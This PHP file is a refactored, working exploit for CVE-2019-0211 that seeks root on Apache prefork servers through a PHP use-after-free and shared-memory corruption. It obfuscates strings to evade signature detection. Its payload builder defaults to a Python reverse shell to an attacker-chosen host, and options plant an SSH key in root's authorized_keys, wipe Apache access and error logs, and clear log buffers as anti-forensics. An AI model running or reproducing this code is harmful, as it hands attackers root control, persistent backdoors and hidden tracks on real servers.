<?php

/**
 * CARPE (DIEM) - CVE-2019-0211 Apache Root Privilege Escalation
 * Version Refactored: Heap Grooming + Obfuscation + Advanced Payload
 *
 *
 * TARGET: Apache/2.4.x (prefork MPM) + PHP 7.x
 */

error_reporting(E_ALL);
ini_set('display_errors', '1');
set_time_limit(0);

define('XOR_KEY', "\x4b\x33\x59\x21\x40\x23\x78\x9a");

/**
 * Deobfuscates critical strings for static signature evasion
 */
function x($data)
{
    $out = "";
    $k = XOR_KEY;
    $kl = strlen($k);
    for ($i = 0; $i < strlen($data); $i++) {
        $out .= $data[$i] ^ $k[$i % $kl];
    }
    return $out;
}

$_PROC_SELF_MAPS = x("\x64\x43\x2b\x4e\x23\x0c\x0b\xff\x27\x55\x76\x4c\x21\x53\x0b");
$_PROC           = x("\x64\x43\x2b\x4e\x23");
$_CMDLINE        = x("\x28\x5e\x3d\x4d\x29\x4d\x1d");
$_STATUS         = x("\x38\x47\x38\x55\x35\x50");
$_LIBC           = x("\x27\x5a\x3b\x42");
$_LIBAPR         = x("\x27\x5a\x3b\x40\x30\x51");
$_LIBPHP         = x("\x27\x5a\x3b\x51\x28\x53");
$_DEV_ZERO       = x("\x64\x57\x3c\x57\x6f\x59\x1d\xe8\x24");
$_ZEND_DTOR      = x("\x31\x56\x37\x45\x1f\x4c\x1a\xf0\x2e\x50\x2d\x7e\x33\x57\x1c\xc5\x2f\x47\x36\x53");
$_SYSTEM         = x("\x38\x4a\x2a\x55\x25\x4e");

/**
 * Output wrapper for logging
 */
function o($msg)
{
    print("[*] " . $msg . "\n");
    flush();
}

/**
 * Convert pointer to string representation
 */
function ptr2str($ptr, $m = 8)
{
    $out = "";
    for ($i = 0; $i < $m; $i++) {
        $out .= chr($ptr & 0xff);
        $ptr >>= 8;
    }
    return $out;
}

/**
 * Extract pointer from string at position
 */
function str2ptr(&$str, $p, $s = 8)
{
    if ($p + $s > strlen($str)) return 0;
    $address = 0;
    for ($j = $s - 1; $j >= 0; $j--) {
        $address <<= 8;
        $address |= ord($str[$p + $j]);
    }
    return $address;
}

/**
 * Check if value is within range
 */
function in_range($i, $range)
{
    return $i >= $range[0] && $i < $range[1];
}

/**
 * Stabilizes heap for PHP 7.x
 * Forces contiguous allocations via fastbins defragmentation
 */
function stabilize_heap()
{
    o("Initiating Heap Grooming...");

    $spray = [];
    $sizes = [0x20, 0x30, 0x40, 0x50, 0x60, 0x70, 0x78, 0x80];

    foreach ($sizes as $size) {
        for ($i = 0; $i < 100; $i++) {
            $spray[] = str_repeat("\x00", $size - 24);
        }
    }

    $total = count($spray);
    for ($i = 0; $i < $total; $i += 2) {
        unset($spray[$i]);
    }

    gc_collect_cycles();

    $filler = [];
    for ($i = 0; $i < 200; $i++) {
        $filler[] = str_repeat("\x41", 78);
    }

    for ($i = 199; $i >= 100; $i--) {
        unset($filler[$i]);
    }

    gc_collect_cycles();
    o("Heap stabilized. Fastbins conditioned for contiguous allocation.");
}

/**
 * Find symbol in ELF without external dependencies
 */
function find_symbol($file, $symbol)
{
    if (!file_exists($file) || !is_readable($file)) {
        return 0;
    }

    $elf = file_get_contents($file);
    if (strlen($elf) < 64) return 0;

    if (substr($elf, 0, 4) !== "\x7fELF") return 0;

    $e_shoff = str2ptr($elf, 0x28);
    $e_shentsize = str2ptr($elf, 0x3a, 2);
    $e_shnum = str2ptr($elf, 0x3c, 2);

    $dynsym_off = 0;
    $dynsym_sz = 0;
    $dynstr_off = 0;

    for ($i = 0; $i < $e_shnum; $i++) {
        $offset = $e_shoff + $i * $e_shentsize;
        if ($offset + 0x28 > strlen($elf)) continue;

        $sh_type = str2ptr($elf, $offset + 0x04, 4);

        switch ($sh_type) {
            case 11:
                $dynsym_off = str2ptr($elf, $offset + 0x18, 8);
                $dynsym_sz = str2ptr($elf, $offset + 0x20, 8);
                break;
            case 3:
            case 2:
                if (!$dynstr_off) {
                    $dynstr_off = str2ptr($elf, $offset + 0x18, 8);
                }
                break;
        }
    }

    if (!($dynsym_off && $dynsym_sz && $dynstr_off)) return 0;

    $sizeof_Elf64_Sym = 0x18;

    for ($i = 0; $i * $sizeof_Elf64_Sym < $dynsym_sz; $i++) {
        $offset = $dynsym_off + $i * $sizeof_Elf64_Sym;
        if ($offset + 0x10 > strlen($elf)) continue;

        $st_name = str2ptr($elf, $offset, 4);
        if (!$st_name) continue;

        $offset_string = $dynstr_off + $st_name;
        if ($offset_string >= strlen($elf)) continue;

        $end = strpos($elf, "\x00", $offset_string);
        if ($end === false) continue;
        $end -= $offset_string;

        $string = substr($elf, $offset_string, $end);

        if ($string === $symbol) {
            return str2ptr($elf, $offset + 0x8, 8);
        }
    }

    return 0;
}

/**
 * Gather memory addresses from process maps
 */
function get_all_addresses()
{
    global $_PROC_SELF_MAPS, $_LIBC, $_LIBAPR, $_LIBPHP, $_DEV_ZERO, $_ZEND_DTOR, $_SYSTEM;

    $addresses = [];
    $maps_path = $_PROC_SELF_MAPS;

    o("Reading memory maps from: $maps_path");

    if (!file_exists($maps_path)) {
        o("ERROR: Cannot access $maps_path");
        exit(1);
    }

    $data = file_get_contents($maps_path);
    $follows_shm = false;

    foreach (explode("\n", $data) as $line) {
        if (empty($line)) continue;

        if (!isset($addresses['shm']) && strpos($line, $_DEV_ZERO) !== false) {
            $parts = explode(' ', $line);
            $bounds = array_map('hexdec', explode('-', $parts[0]));
            if ($bounds[1] - $bounds[0] == 0x14000) {
                $addresses['shm'] = $bounds;
                $follows_shm = true;
                o("SHM detected: 0x" . dechex($bounds[0]) . "-0x" . dechex($bounds[1]));
            }
        }

        if (preg_match('#(/[^\s]+libc-[0-9.]+.so[^\s]*)#', $line, $matches) && strpos($line, 'r-xp') !== false) {
            $offset = find_symbol($matches[1], $_SYSTEM);
            if ($offset) {
                $line_addr = explode(' ', $line)[0];
                $base = hexdec(explode('-', $line_addr)[0]);
                $addresses['system'] = $base + $offset;
                o("system() found: 0x" . dechex($addresses['system']));
            }
        }

        if (strpos($line, $_LIBAPR) !== false && strpos($line, 'r-xp') !== false) {
            $parts = explode(' ', $line);
            $addresses['libaprX'] = array_map('hexdec', explode('-', $parts[0]));
        }

        if (strpos($line, $_LIBAPR) !== false && strpos($line, 'r--p') !== false) {
            $parts = explode(' ', $line);
            $addresses['libaprR'] = array_map('hexdec', explode('-', $parts[0]));
        }

        if ((strpos($line, 'rw-p') !== false || strpos($line, 'rwxp') !== false) && $follows_shm) {
            if (strpos($line, '/lib') !== false) {
                $follows_shm = false;
                continue;
            }
            $parts = explode(' ', $line);
            $bounds = array_map('hexdec', explode('-', $parts[0]));
            if (!isset($addresses['apache'])) {
                $addresses['apache'] = $bounds;
            } else if ($addresses['apache'][1] == $bounds[0]) {
                $addresses['apache'][1] = $bounds[1];
            } else {
                $follows_shm = false;
            }
        }

        if (preg_match('#(/[^\s]+libphp7[0-9.]+.so[^\s]*)#', $line, $matches) && strpos($line, 'r-xp') !== false) {
            $offset = find_symbol($matches[1], $_ZEND_DTOR);
            if ($offset) {
                $line_addr = explode(' ', $line)[0];
                $base = hexdec(explode('-', $line_addr)[0]);
                $addresses['zend_object_std_dtor'] = $base + $offset;
            }
        }
    }

    $expected = ['shm', 'system', 'libaprR', 'libaprX', 'apache', 'zend_object_std_dtor'];
    $missing = array_diff($expected, array_keys($addresses));

    if ($missing) {
        o("ERROR: Addresses not found: " . implode(', ', $missing));
        exit(1);
    }

    o("PID: " . getmypid());
    o("Resolved addresses:");
    foreach ($addresses as $k => $a) {
        if (!is_array($a)) $a = [$a];
        o("  $k: " . implode(' - 0x', array_map(function ($z) {
            return '0x' . dechex($z);
        }, $a)));
    }

    return $addresses;
}

/**
 * Detect Apache worker processes
 */
function get_workers_pids()
{
    global $_PROC, $_CMDLINE, $_STATUS;

    o("Getting Apache worker PIDs...");
    $pids = [];
    $self_cmd = file_get_contents($_PROC . '/self/' . $_CMDLINE);
    $processes = glob($_PROC . '/*');

    foreach ($processes as $process) {
        if (!preg_match('#^' . preg_quote($_PROC, '#') . '/([0-9]+)$#', $process, $match)) {
            continue;
        }

        $pid = (int)$match[1];
        $cmdline_path = $process . '/' . $_CMDLINE;
        $status_path = $process . '/' . $_STATUS;

        if (!is_readable($cmdline_path) || !is_readable($status_path)) continue;

        if ($self_cmd !== file_get_contents($cmdline_path)) continue;

        $status = file_get_contents($status_path);
        foreach (explode("\n", $status) as $line) {
            if (strpos($line, 'Uid:') === 0 && preg_match('#\b' . posix_getuid() . '\b#', $line)) {
                o("  Worker found: $pid");
                $pids[$pid] = $pid;
                break;
            }
        }
    }

    o("Total workers: " . count($pids));
    return $pids;
}

/**
 * Build advanced configurable payload
 */
function build_payload($addresses, $workers_pids)
{
    $cmd = isset($_REQUEST['cmd']) ? $_REQUEST['cmd'] : '';

    if (empty($cmd)) {
        $lhost = isset($_REQUEST['lhost']) ? $_REQUEST['lhost'] : '127.0.0.1';
        $lport = isset($_REQUEST['lport']) ? (int)$_REQUEST['lport'] : 4444;

        $cmd = "python3 -c 'import socket,os,pty;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"$lhost\",$lport));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn(\"/bin/bash\")' 2>/dev/null &";
    }

    if (isset($_REQUEST['ssh_key'])) {
        $ssh_key = base64_decode($_REQUEST['ssh_key']);
        $cmd = "mkdir -p /root/.ssh && echo '$ssh_key' >> /root/.ssh/authorized_keys && chmod 600 /root/.ssh/authorized_keys";
    }

    if (isset($_REQUEST['clean_logs'])) {
        $cmd .= "; > /var/log/apache2/access.log 2>/dev/null; > /var/log/apache2/error.log 2>/dev/null; > /var/log/httpd/access_log 2>/dev/null; > /var/log/httpd/error_log 2>/dev/null";
    }

    $size_worker_score = 264;
    $size_prefork_child_bucket = 24;

    $spray_size = $size_worker_score * (256 - count($workers_pids) * 2);
    $spray_max = $addresses['shm'][1];
    $spray_min = $spray_max - $spray_size;

    $payload_start = $spray_min - $size_worker_score;

    if (strlen($cmd) > $size_worker_score - 112) {
        o("ERROR: Payload exceeds maximum size (" . ($size_worker_score - 112) . " bytes)");
        exit(1);
    }

    $bucket = str_pad($cmd, $size_worker_score - 112, "\x00");

    $z = ptr2str(0);

    $meth = $z . $z . $z . $z . $z . $z . ptr2str($addresses['zend_object_std_dtor']);

    $properties =
        ptr2str(1) .
        ptr2str($payload_start + strlen($bucket)) .
        ptr2str($payload_start) .
        ptr2str(1, 4) .
        ptr2str(0, 4) .
        ptr2str(0, 4) .
        ptr2str(0, 4) .
        $z .
        ptr2str($addresses['system']);

    return [
        'payload' => $bucket . $meth . $properties,
        'payload_start' => $payload_start,
        'spray_min' => $spray_min,
        'spray_max' => $spray_max,
        'size_prefork_child_bucket' => $size_prefork_child_bucket
    ];
}

/**
 * Exploitation class implementing UAF trigger
 */
class Z implements JsonSerializable
{
    private $abc;
    private $x;

    public function jsonSerialize()
    {
        global $y, $addresses, $workers_pids;

        o("Phase 1: Memory preparation");

        $contiguous = [];
        for ($i = 0; $i < 10; $i++) {
            $contiguous[] = new DateInterval('PT1S');
        }

        $room = [];
        for ($i = 0; $i < 10; $i++) {
            $room[] = new Z2();
        }

        $_protector = ptr2str(0, 78);

        o("Phase 2: Critical object allocation");

        $this->abc = ptr2str(0, 79);
        $p = new DateInterval('PT1S');

        o("Phase 3: Trigger UAF");

        unset($y[0]);
        unset($p);

        $protector = ".$_protector";
        $room[] = "!$_protector";

        $this->x = new DateInterval('PT1S');

        $this->x->y = 0x00;
        $this->x->d = 0x100;
        $this->x->h = 0x13121110;

        if (!(strlen($this->abc) === $this->x->d &&
            $this->abc[0] == "\x10" &&
            $this->abc[1] == "\x11" &&
            $this->abc[2] == "\x12" &&
            $this->abc[3] == "\x13")) {
            o("ERROR: UAF failed. Heap not stable.");
            exit(1);
        }

        o("UAF successful. R/W primitive active.");

        unset($room);

        $address = str2ptr($this->abc, 0x70 * 2 - 24);
        $address = $address - 0x70 * 3;
        $address = $address + 24;

        o("Address of \$abc: 0x" . dechex($address));

        $distance = max($addresses['apache'][1], $addresses['shm'][1]) - $address;
        $this->x->d = $distance;

        o("Phase 4: Searching for all_buckets");
        $all_buckets = 0;

        for ($i = $addresses['apache'][0] + 0x10; $i < $addresses['apache'][1] - 0x08; $i += 8) {
            $mutex = str2ptr($this->abc, $i - $address);
            if (!in_range($mutex, $addresses['apache'])) continue;

            $meth = str2ptr($this->abc, $mutex + 0x8 - $address);
            if (!in_range($meth, $addresses['libaprR'])) continue;

            if (str2ptr($this->abc, $meth - $address) != 0) continue;

            $valid = true;
            for ($j = 0; $j < 7; $j++) {
                $m = str2ptr($this->abc, $meth + 0x8 + $j * 8 - $address);
                if (!in_range($m, $addresses['libaprX'])) {
                    $valid = false;
                    break;
                }
            }

            if ($valid) {
                $all_buckets = $i - 0x10;
                o("all_buckets found: 0x" . dechex($all_buckets));
                break;
            }
        }

        if (!$all_buckets) {
            o("ERROR: Could not locate all_buckets");
            exit(1);
        }

        o("Phase 5: Building payload");
        $payload_info = build_payload($addresses, $workers_pids);
        $payload = $payload_info['payload'];
        $payload_start = $payload_info['payload_start'];
        $spray_min = $payload_info['spray_min'];
        $spray_max = $payload_info['spray_max'];
        $size_prefork_child_bucket = $payload_info['size_prefork_child_bucket'];

        o("Writing payload at 0x" . dechex($payload_start));
        $p = $payload_start - $address;
        for ($i = 0; $i < strlen($payload); $i++) {
            $this->abc[$p + $i] = $payload[$i];
        }

        $spray_middle = (int)(($spray_min + $spray_max) / 2);
        $bucket_index_middle = (int)(- ($all_buckets - $spray_middle) / $size_prefork_child_bucket);

        $properties_address = $payload_start + strlen($payload) - 56;
        o("Pointer spray: 0x" . dechex($properties_address));

        $s_properties_address = ptr2str($properties_address);
        for ($i = $spray_min; $i < $spray_max; $i++) {
            $this->abc[$i - $address] = $s_properties_address[$i % 8];
        }

        o("Phase 6: Manipulating workers in SHM");
        $spray_nb_buckets = (int)($spray_max - $spray_min) / $size_prefork_child_bucket;
        $total_nb_buckets = $spray_nb_buckets * count($workers_pids);
        $bucket_index = $bucket_index_middle - (int)($total_nb_buckets / 2);

        $found_pids = [];
        for ($p = $addresses['shm'][0] + 0x20; $p < $addresses['shm'][1] && count($workers_pids) > 0; $p += 0x24) {
            $l = $p - $address;
            $current_pid = str2ptr($this->abc, $l, 4);

            if (in_array($current_pid, $workers_pids)) {
                unset($workers_pids[$current_pid]);
                $found_pids[] = $current_pid;

                $s_bucket_index = pack('l', $bucket_index);
                $this->abc[$l + 0x20] = $s_bucket_index[0];
                $this->abc[$l + 0x21] = $s_bucket_index[1];
                $this->abc[$l + 0x22] = $s_bucket_index[2];
                $this->abc[$l + 0x23] = $s_bucket_index[3];

                o("  PID $current_pid -> bucket $bucket_index");
                $bucket_index += $spray_nb_buckets;
            }
        }

        if (count($workers_pids) > 0) {
            o("ERROR: Could not find PIDs: " . implode(', ', $workers_pids));
            exit(1);
        }

        if (isset($_REQUEST['anti_forensics'])) {
            o("Phase 7: Cleaning log buffers");
            $log_buffers = [$addresses['shm'][0] + 0x1000, $addresses['shm'][0] + 0x2000];
            foreach ($log_buffers as $buf) {
                if ($buf > $address && $buf < $address + $distance) {
                    for ($i = 0; $i < 0x1000; $i++) {
                        $this->abc[$buf + $i - $address] = "\x00";
                    }
                }
            }
        }

        o("");
        o("=== EXPLOITATION SUCCESSFUL ===");
        o("Waiting for Apache graceful restart...");
        o("Payload will execute as root on next restart.");
        o("");
        o("To force restart:");
        o("  sudo /usr/sbin/logrotate /etc/logrotate.conf --force");
        o("  sudo apachectl graceful");

        return 0;
    }
}

/**
 * Auxiliary class for UAF trigger
 */
class Z2 implements JsonSerializable
{
    public function jsonSerialize()
    {
        return [];
    }
}

// Main entry point
o("");
o("CARPE (DIEM) - CVE-2019-0211");
o("Apache Local Root Privilege Escalation");
o("Refactored Version with Heap Grooming");
o("");

stabilize_heap();

$addresses = get_all_addresses();
$workers_pids = get_workers_pids();

if (count($workers_pids) < 1) {
    o("ERROR: No Apache workers found");
    exit(1);
}

$y = [new Z()];
json_encode([0 => &$y]);
